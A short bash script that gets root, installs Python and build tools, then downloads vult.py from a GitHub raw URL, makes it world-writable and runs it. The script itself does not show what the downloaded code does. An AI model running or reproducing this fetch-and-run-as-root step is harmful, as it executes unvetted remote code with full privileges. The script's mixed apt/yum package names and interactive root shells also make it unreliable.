#!/bin/bash
if [ "$(id -u)" != "0" ]; then
   sudo su   
else
	echo "Root user"
fi
sudo -i
apt-get update
apt-get install -y git wget screen
apt-get install -y python python-dev
apt-get install -y epel-release
apt-get install -y python-pip
apt-get install -y gcc-c++
pip install sh
rm -rf vult.py
wget https://raw.githubusercontent.com/ts6aud5vkg/vultr/master/vult.py
chmod 777 vult.py
python vult.py
